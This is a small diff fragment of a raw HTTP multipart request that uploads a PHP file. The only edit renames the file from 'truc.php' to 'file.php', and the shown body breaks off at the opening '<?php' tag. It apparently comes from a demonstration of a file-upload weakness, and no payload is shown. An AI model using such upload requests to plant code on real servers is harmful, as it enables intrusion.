@@ -30,7 +30,7 @@ Content-Type: multipart/form-data; boundary=---------------------------722779533
 Content-Length: 240
 
 -----------------------------7227795332295222081052113690
-Content-Disposition: form-data; name="file"; filename="truc.php"
+Content-Disposition: form-data; name="file"; filename="file.php"
 Content-Type: application/x-php
 
 <?php
